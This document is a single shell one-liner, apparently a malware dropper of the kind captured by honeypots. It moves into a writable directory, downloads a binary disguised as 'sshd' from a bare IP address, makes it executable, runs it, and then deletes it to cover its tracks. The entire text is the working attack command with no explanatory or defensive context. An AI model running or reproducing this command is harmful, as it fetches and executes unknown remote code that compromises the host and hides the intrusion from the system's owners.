cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://23.94.164.173/sshd; chmod +x sshd; ./sshd; rm -rf sshd
